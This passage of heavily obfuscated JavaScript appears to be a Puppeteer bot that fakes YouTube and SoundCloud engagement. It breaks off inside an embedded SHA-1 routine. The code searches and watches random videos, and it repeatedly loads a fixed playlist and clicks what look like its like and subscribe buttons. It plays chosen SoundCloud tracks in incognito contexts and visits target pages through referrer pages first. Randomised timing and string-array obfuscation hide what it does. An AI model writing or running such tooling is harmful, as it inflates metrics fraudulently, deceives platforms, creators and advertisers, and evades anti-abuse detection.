const Z = d,
  Y = b,
  X = c;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x22e + -0x45 * 0x53 + 0x188d);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1 * -0x2b3 + 0x6b + 0x27 * 0xf))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x53 * -0x6f + 0xb * 0x44 + 0x2111), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x83 * -0x12a + 0x9d2e + 0x7080 + (0x23b7 + 0x5e99 + -0x47b8) * random()) : await standardWaitForNetIdle(f), await wait(-0x174a + 0x12b7 * -0x1 + 0x1 * 0x3d89 + (0x351a + -0x9b5 + -0x1 * 0x455) * random()), -0x1d * 0x31 + -0x1b85 + 0x2113 * 0x1;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x22e + -0x45 * 0x53 + 0x188d);
    let h = e[f];
    if (b['QVJKCC'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x2500 + 0x21e9 * -0x1 + -0x317, s, t, u = 0x3af * 0x6 + -0x21c4 + 0xbaa; t = n['charAt'](u++); ~t && (s = r % (0x1 * -0x2b3 + 0x6b + 0x1c * 0x15) ? s * (0x53 * -0x6f + 0xb * 0x44 + 0x2151) + t : t, r++ % (0x9 * -0x2d3 + 0x1a33 + -0xc4)) ? p += String['fromCharCode'](0xbe8 + 0x1f89 + -0x2a72 & s >> (-(-0x174a + 0x12b7 * -0x1 + 0x1 * 0x2a03) * r & 0x1a8d + -0x4db + -0x13 * 0x124)) : -0x1d * 0x31 + -0x1b85 + 0x1f2 * 0x11) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1 * 0xce + -0x6 * -0x4 + 0x7 * 0x1a, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x48f * 0x5 + 0x431 * 0x1 + -0x1aec))['slice'](-(0x27a * 0x6 + -0xd5e * -0x2 + -0x2996));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x213b + -0x19fd + -0x6 * 0x135,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x3 * -0x15c + -0x1ad2 + 0x16be; u < 0xcdb + 0x1501 + -0x20dc; u++) {
          p[u] = u;
        }
        for (u = -0x581 * 0x2 + -0x2117 + -0x9f * -0x47; u < 0x1d74 + -0x1e04 * -0x1 + -0x2 * 0x1d3c; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1f66 + -0x545 + -0x1921), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xbb5 + 0x8fb * 0x3 + -0x28a * 0x6, q = 0x5 * -0x42e + -0x25a5 + -0x1 * -0x3a8b;
        for (let v = -0x4 * -0x969 + 0x190d + 0xb * -0x5b3; v < n['length']; v++) {
          u = (u + (0x283 + -0x30a + 0x88)) % (-0x1 * 0x127d + -0x1024 + 0x23a1 * 0x1), q = (q + p[u]) % (0x19 * 0x5e + 0x1173 * -0x2 + -0x2f8 * -0x9), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1df4 + 0x29 * 0x1f + -0x19fd * -0x1)]);
        }
        return t;
      };
      b['YVgtJh'] = m, c = arguments, b['QVJKCC'] = !![];
    }
    const j = e[0x22 * -0x8b + 0x3e * 0x6a + -0x736],
      k = f + j,
      l = c[k];
    return !l ? (b['kTMkXV'] === undefined && (b['kTMkXV'] = !![]), h = b['YVgtJh'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1 * 0xce + -0x6 * -0x4 + 0x2 * 0xa1f), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x48f * 0x5 + 0x431 * 0x1 + -0x1afb;
}

function a() {
  const bk = [
    'h8ozW6xcI8o9Aa',
    'ayButtonHe',
    'iKRcIG',
    'W74zWOqjW4C',
    'BgvUz3rO',
    'raxdMaddHa',
    'AgfZAgvK',
    'W5SuW7XdmurnWOZcJ1i',
    'CYXHCM15igj0CW',
    'Ahr0Chm6lY9NCG',
    'tHDmFCk9jdVcT8oaDG',
    'W4WyxLnwfqxcTSk5WPy',
    'ourZAfu1nuvPvG',
    'bbNdGh9jW7hdKISZW4m',
    'WQdcUCk0WQCJWRZdNCkt',
    'yCofsmkmFmkLeX1zwa',
    'zsb5DgqTCMLJAa',
    'A7%86%E9%A',
    'Android\x2010'
  ];
  a = function() {
    return bk;
  };
  return a();
}
async function randomWait() {
  return await wait(0x27a * 0x6 + -0xd5e * -0x2 + -0x1610 + (0x213b + -0x19fd + -0xd * -0xf2) * random()), -0x3 * -0x15c + -0x1ad2 + 0x16bf;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xcdb + 0x1501 + -0x21dc, -0x581 * 0x2 + -0x2117 + -0x161 * -0x20), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x16170 + -0x16827 * -0x1 + -0x3 * 0x9fbd) * getRandomInt(0x1f66 + -0x545 + -0x1a1f, -0xbb5 + 0x8fb * 0x3 + -0x30b * 0x5), h)), 0x5 * -0x42e + -0x25a5 + -0x2 * -0x1d46;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x4 * -0x969 + 0x190d + 0xb * -0x5b3;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x283 + -0x30a + 0x88]['split']('\x20');
    for (let k = -0x1 * 0x127d + -0x1024 + 0x22a1 * 0x1; k < i['length']; k += 0x19 * 0x5e + 0x1173 * -0x2 + -0xcdd * -0x2)
      j += i[k] * h[i[k + (-0x1df4 + 0x29 * 0x1f + -0x392 * -0x7)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + R(0x10) + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x22 * -0x8b + 0x3e * 0x6a + -0x730)['map'](l => Array['from'](l['children']))['flat'](-0x3 * 0x5bd + 0xc1d * 0x2 + 0x12b * -0x6)['map'](l => l['childNodes'][0x13 * 0x20a + -0x235d * -0x1 + 0xa96 * -0x7]['childNodes'][0x156d + -0x1076 + 0x1 * -0x4f7]['childNodes'][0x694 * -0x1 + 0x2 * 0xbff + 0x1 * -0x1169]['childNodes'][0x141d + 0x1408 + -0x2825]['childNodes'][0xfc8 + -0xfe * 0x5 + -0xad1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x2518 + 0x16bd * -0x1 + -0x5 * 0x217, 0x26e8 + -0x1b9 * -0x9 + -0x1 * 0x22e1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x460 * 0x1a + -0x3a2 * -0xd + 0x6662 * -0x1);
  const h = await getMaxTime(f),
    i = Math['min']((0x1 * -0xbd17 + 0x4b06 + 0x15c71) * getRandomInt(0xba4 + -0x8b * 0x19 + 0x1f1, 0x108c + 0x13 * 0x7 + -0x110c), h);
  return await wait(i), 0x73 * 0x17 + -0x4 * -0x521 + -0x6 * 0x524;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1f58 + -0x263 + -0x1cf5]['children'][0xc05 + 0x129d * -0x2 + 0x1935]['children'][0x1 * -0x2109 + -0x1fd + 0x1 * 0x2306]['children'][-0x4 * 0x1f + -0xdfa + 0xe76]['children'][-0x15cc + 0x289 * 0x3 + 0xe31]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x9e5 + -0x32c + -0x6b8;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x39 * 0x55 + -0x1c4d + 0x2f9e + (-0x1 * -0xc97 + -0x2371 + 0xa * 0x24e) * random()
  }), await wait(-0x107b * -0x1 + -0x8b2 + -0x5d5 * 0x1 + (0x1 * 0x12f0 + -0x1 * 0xec9 + -0x1 * 0x2fb) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x203 * 0x4 + -0x1b5 * -0x4 + 0x2 * 0x9d]['childNodes'][-0x12a7 + -0x1 * -0x22db + 0xd * -0x13f]['childNodes'][-0xf2e + 0x1379 + -0x3d * 0x12]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x17 * -0x121 + 0x12d1 + 0x16f * 0x5]['childNodes'][0x59e * -0x4 + -0x19e3 + -0x305b * -0x1]['childNodes'][-0x13 * 0x191 + -0x1aa0 + 0x3865]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x718 + 0x570 * -0x2 + 0x3c9),
          r = -0x259a + -0x46d * 0x7 + 0x4495;
        for (let u = 0x1bb8 + -0x7 * 0x53b + 0x8e5; u < q['length']; u += 0xb2a + -0x46d + -0x6bb * 0x1)
          r += q[u] * k[q[u + (0x2144 + -0xac0 + 0x3 * -0x781)]];
        return r;
      }(n);
  });
  await wait((-0x6e60 + -0x2e29 + -0x1 * -0xd721) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1 * -0x8360 + -0x1c * -0x6ac + -0x53d0 * 0x1) * getRandomInt(-0xce0 + 0x801 + 0x4e0, -0x179a + -0x20da + 0x387e), h + (-0x1aa8 + -0x1b6 + -0x2 * -0x17f3));
  return await wait(i), 0x1737 + 0x19 * 0xdf + -0x2cfd;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x22e + -0x45 * 0x53 + 0x188d);
    let h = e[f];
    if (c['NDcrzH'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x2500 + 0x21e9 * -0x1 + -0x317, r, s, t = 0x3af * 0x6 + -0x21c4 + 0xbaa; s = m['charAt'](t++); ~s && (r = q % (0x1 * -0x2b3 + 0x6b + 0x1c * 0x15) ? r * (0x53 * -0x6f + 0xb * 0x44 + 0x2151) + s : s, q++ % (0x9 * -0x2d3 + 0x1a33 + -0xc4)) ? o += String['fromCharCode'](0xbe8 + 0x1f89 + -0x2a72 & r >> (-(-0x174a + 0x12b7 * -0x1 + 0x1 * 0x2a03) * q & 0x1a8d + -0x4db + -0x13 * 0x124)) : -0x1d * 0x31 + -0x1b85 + 0x1f2 * 0x11) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1 * 0xce + -0x6 * -0x4 + 0x7 * 0x1a, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x48f * 0x5 + 0x431 * 0x1 + -0x1aec))['slice'](-(0x27a * 0x6 + -0xd5e * -0x2 + -0x2996));
        }
        return decodeURIComponent(p);
      };
      c['YkQiRT'] = i, b = arguments, c['NDcrzH'] = !![];
    }
    const j = e[0x213b + -0x19fd + -0x6 * 0x135],
      k = f + j,
      l = b[k];
    return !l ? (h = c['YkQiRT'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  const S = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x17ec + 0xad6 * 0x2 + 0x240), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xf3f * -0x2 + 0x1eb6 * -0x1 + 0x4 * 0x123b + (0x5 * -0x764 + 0x35 * 0xa0 + 0x7bc) * Math['random']());
    });
  }, 0x7 * -0x76f + 0x2 * -0x8e9 + 0x6133);
  await wait(0x49d17 + -0x139b + 0x23 * 0x4c);
  try {
    await f[S(0x5, '&xE8')]('#__lllll');
  } catch (i) {}
  return await wait((0xc0d + -0x17906 + 0x25759) * getRandomInt(0x3 * -0x841 + 0x3ee + 0x251 * 0x9, -0x1403 + 0x1c86 + -0x86a)), clearInterval(h), 0x748 + -0x2db + 0x2 * -0x236;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0xe0d + 0xad5 * 0x1 + -0xb6 * 0x23;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1267 + 0x47 * 0x52 + -0x456;
    await randomWait();
  }
  return -0x1fb7 + 0x23f3 + -0x43b;
}

function fetchRandomSC() {
  return Math['random']() <= 0xcb + -0xbbf + -0x2 * -0x57a + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x141d * 0x1 + -0x23 * -0x9b + -0x114 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x16d7 + 0x21fb + -0x38d2 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x762 * 0x4 + -0x1b2 + -0x2 * 0xdeb;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k[T(0x3, 'OKgL')](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const U = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + U(0x1) + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xaf4 * 0x1 + 0x1 * -0x3c1b + -0x287 * -0x59 + getRandomInt(0x22a9 + -0x4 * 0x1927 + -0x7c8b * -0x1, 0x37f1 + 0x8208 + -0x44c9));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1b * 0xad + -0x1 * -0x390 + 0xeb0), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x2 * 0x921 + 0x18 + 0x307 * 0x6;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x113e + 0x26c5 + -0x1 * 0x3803, -0xfa7 + -0x1c70 + 0x2c49)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0xbab + 0x1afd * -0x1 + -0xe * -0x1a7 + floor((-0x4 * 0x4a5 + 0x4e2 + -0x3 * -0x5de) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x11b07072 * -0x8 + -0x80f411ba + 0x73708e2a),
          -0x6d29d3 + -0xb654aa * 0x1 + -0x11fe9 * -0x175,
          0xc060 + -0x3891 + -0x7cf,
          -0x8f * 0x34 + 0x92 * -0xf + -0x130d * -0x2
        ], y = [
          -0x87f + -0x2 * 0x1301 + 0x2e99,
          0xecf * 0x1 + 0xa99 + -0x8 * 0x32b,
          0x10d9 * -0x2 + -0x1 * -0x20e3 + 0xd7,
          0x2542 + -0xdf4 + 0x13 * -0x13a
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1622 + -0x4ca + 0x1 * -0x1157)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x16d3 + 0x195e + -0x28b; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1 * -0xe41 + -0x7 * -0x359 + -0x25b0) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0xa9a * -0x3 + -0x1ac * -0xf + 0x6ba] = A[-0x59 * -0x4 + 0xf66 + -0x1 * 0x10ba] = A[-0x1b5e + 0x13f5 * 0x1 + -0x92 * -0xd] = A[0xe * 0x7f + 0x1164 * 0x1 + -0x1854] = A[0x1 * -0x69 + 0xb3 * 0x29 + -0x409 * 0x7] = A[0x1db5 + 0x2 * 0xfcf + -0x3d4f] = A[0x5 * -0x2a3 + 0x1 * 0x1f0f + -0x11db] = A[0x1219 + -0x2304 + 0x10f1] = A[0x1392 + 0x7 * -0x515 + -0x36 * -0x4c] = A[-0x57 * 0x9 + -0x18fd + 0x1c14] = A[0x8c8 + -0xda3 * -0x2 + 0x2405 * -0x1] = A[-0xb25 + -0x5 * 0x7ae + -0x1 * -0x3195] = A[0x8ce + -0x1d9a + -0x14d7 * -0x1] = A[0x1640 + -0x145 * -0xb + -0x242b] = A[-0x1321 + -0x21b7 + 0x34e5] = A[-0x739 + 0xaa4 + -0x35d] = A[0x989 + -0x35 * 0x10 + 0x3 * -0x20e] = -0x19 * -0x128 + -0x1 * 0x1e6d + 0x185 * 0x1, this['blocks'] = A) : this['blocks'] = [
                0x7ca + -0x22a * 0x1 + -0x5a0,
                0x11bc * 0x1 + -0x17 * 0x149 + 0xbd3,
                -0x97 * 0x37 + 0x2164 + -0xf3,
                -0xf2f + -0x1753 + 0x2682,
                0x1b52 * -0x1 + 0xaa0 + 0x10b2,
                -0x1e8d + 0xa9c + 0x13f1,
                0x9aa * -0x1 + 0x1 * -0x180b + 0x21b5 * 0x1,
                -0x4c7 * 0x7 + 0x1174 * 0x2 + 0x19 * -0xf,
                -0x1273 + 0x23ce + -0x1 * 0x115b,
                0x2 * -0x761 + -0x76f * 0x1 + 0x1631,
                0x1 * 0x781 + 0xa * -0x41 + -0x4f7,
                0x557 * 0x5 + 0x8 * 0x399 + 0x7 * -0x7ed,
                -0x1411 * 0x1 + 0xcb1 * 0x3 + -0x1202,
                0x1117 + 0x29 * -0xa4 + 0x92d,
                -0x2 * 0x935 + 0x1 * -0x1ae5 + 0x2d4f,
                0x49 * -0x54 + 0x1315 + 0x4df,
                -0x3d1 + -0x1e6 + 0x5b7
              ], this['h0'] = 0x5404db6d + -0x734e2aa6 + 0x567b2 * 0x18e5, this['h1'] = -0x1cbb845b5 + -0xa225afa7 + 0x35daba0e5, this['h2'] = -0x7 * 0x2a3c3f1 + 0x8c769951 + 0x1ebe9f44, this['h3'] = 0x5beeb3 * -0x40 + 0x1b877a2e + 0xba68708, this['h4'] = 0xe5214ba3 + -0x244ec37 * -0x59 + -0xeb4488d2, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xb29 + 0xe42 + -0x196b * 0x1, this['finalized'] = this['hashed'] = 0x9fa + 0x1 * -0x533 + -0x4c7, this['first'] = 0x160a + -0x63d * 0x6 + 0x233 * 0x7;
            }
            ['update'](J) {
              const V = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x8c * 0x28 + -0x12c0 + -0x320, O = J['length'] || -0x128d * 0x2 + 0x577 * 0x6 + 0x8a * 0x8, P = this['blocks']; M < O;) {
                  if (this[V(0x6)] && (this['hashed'] = -0x1 * -0x150b + -0x1008 + 0x503 * -0x1, P[0xa3f * 0x3 + 0x18c6 + -0x3783] = this['block'], P[0x5 * -0x650 + 0x11 * 0x8 + 0x4 * 0x7c6] = P[-0x85f * 0x3 + -0x2 * -0xeef + -0x4c0] = P[0x16 * 0x101 + -0x492 * -0x7 + 0x3 * -0x1206] = P[0x402 + -0xacb * -0x1 + 0x6 * -0x277] = P[0x151b + 0x29 * -0x95 + 0x47 * 0xa] = P[0x1a * -0x143 + 0x1257 + -0xc * -0x135] = P[-0x3af + 0xc2 * -0x8 + 0x9c5 * 0x1] = P[-0x7 * -0x4b7 + -0x377 * 0xa + 0x1ac] = P[0x2 * -0x5e7 + -0x1 * -0x8a7 + -0x32f * -0x1] = P[0x1a6 * 0xd + 0x1ae9 * 0x1 + -0x304e] = P[-0x21ad + 0x956 + -0x1861 * -0x1] = P[0x1c4 + 0x135d * 0x1 + -0x1516] = P[-0x154e + -0x61 * 0x37 + 0x607 * 0x7] = P[-0x1 * -0xdf6 + -0x142 * -0x1c + -0x3121 * 0x1] = P[0x1 * 0x159b + 0xe80 + -0x240d] = P[0xe79 + -0x13 * 0x10f + 0x1 * 0x5b3] = -0x1665 + -0x12 * 0x92 + 0x20a9), K) {
                    for (N = this['start']; M < O && N < 0x26 * 0x11 + 0x801 + -0xa47; ++M)
                      P[N >> 0x7 * 0x245 + 0x1 * 0x26f9 + -0x22 * 0x19d] |= J[M] << y[-0x1 * -0x1851 + -0x261f + -0x49b * -0x3 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x2 * 0x541 + -0x1716 + 0x4 * 0x335; ++M)
                      (L = J['charCodeAt'](M)) < 0x5 * 0x3be + -0x1 * 0x10ae + -0x1c * 0xe ? P[N >> 0x28 * 0x26 + -0x50c * 0x3 + 0x3 * 0x312] |= L << y[0x1 * 0x152b + -0x20b7 + 0xb8f & N++] : L < -0x1 * 0x1483 + 0xe * -0xf + 0x1d55 * 0x1 ? (P[N >> 0xed9 + -0x2340 + 0x1469] |= (-0x3ab + 0x1a10 + -0x15a5 | L >> -0x1375 * 0x2 + -0x1042 + 0x3732) << y[0x29 * -0x47 + -0x3 * -0xa49 + -0x1379 & N++], P[N >> 0x722 + 0x1041 * -0x1 + 0x1 * 0x921] |= (-0x1bd9 + -0x1 * -0x33b + -0x1 * -0x191e | -0x101c + -0x6c5 * 0x4 + -0x1 * -0x2b6f & L) << y[0x219 * 0x5 + 0x3 * -0xcdc + 0x4af * 0x6 & N++]) : L < 0x952a + -0x3 * -0x33e1 + 0x1 * -0x58cd || L >= 0x7 * -0x12a4 + 0x5 * 0x594d + -0x1 * 0x5c05 ? (P[N >> 0x1d11 + -0x617 + -0xf5 * 0x18] |= (0x3 * 0x26f + -0x5b + -0x612 | L >> -0x6e * -0xd + 0xef0 + -0x147a * 0x1) << y[0x1e5c + -0x1caa + -0x1af * 0x1 & N++], P[N >> 0xbc3 + 0xcf5 + -0x18b6] |= (0x24d5 + 0x445 * 0x3 + -0x154 * 0x25 | L >> -0x1886 + -0x2 * 0x12a9 + -0x1eef * -0x2 & -0x1 * 0xf75 + -0xc5a + 0x1c0e) << y[0x1 * 0x1b25 + 0x526 + -0x2048 & N++], P[N >> 0x1 * -0x1455 + -0x2 * 0x8 + -0x3 * -0x6cd] |= (0x2b8 + 0x2461 + -0x2699 | -0xab7 + -0x3 * -0x1d7 + -0x571 * -0x1 & L) << y[-0x3d * 0x69 + -0x1 * 0x1c85 + 0x358d * 0x1 & N++]) : (L = -0x39 * -0x7f6 + 0x1a5d * 0x1 + -0x1 * 0xe023 + ((0x2 * -0x739 + 0x8 * 0x38b + 0xa9 * -0xf & L) << 0x4 * -0x3e9 + 0x1c8 + 0xde6 | 0x167e + -0x1 * -0x1fdc + -0x1 * 0x325b & J['charCodeAt'](++M)), P[N >> 0x45 * -0x1 + -0x3db + 0x422] |= (-0x979 + 0x64f + -0xa * -0x69 | L >> -0xa83 + 0x1 * 0x84a + 0x24b * 0x1) << y[0x121 + -0x2288 + 0x216a & N++], P[N >> -0xe85 + 0x229a + 0x1 * 